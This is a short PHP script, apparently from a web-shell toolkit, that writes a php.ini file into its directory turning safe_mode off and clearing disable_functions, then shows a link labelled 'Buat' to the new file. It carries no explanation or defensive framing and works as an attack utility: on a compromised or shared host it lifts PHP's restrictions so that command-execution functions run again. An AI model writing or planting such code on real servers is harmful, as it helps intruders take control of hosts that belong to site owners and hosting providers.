<?php

$path = getcwd();
$content = '
safe_mode = off
disable_functions = NONE
';
$fff = fopen($path.'/php.ini', 'w'); fwrite($fff, $content); fclose($fff);
echo"<br><br><center><a href='php.ini'class='btn cta' target='_blank'> Buat </a><br></center>";


?>
